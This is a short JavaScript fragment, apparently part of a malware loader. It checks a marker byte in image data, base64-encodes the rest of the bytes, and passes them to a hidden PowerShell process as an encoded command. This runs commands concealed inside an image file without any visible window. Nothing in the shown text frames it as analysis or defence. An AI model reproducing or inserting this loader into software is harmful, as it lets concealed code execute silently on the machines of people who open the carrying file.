if (marker === 0xED) {
  const payload = image.slice(4).toString("base64");
  spawn("powershell.exe", ["-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", payload]);
}
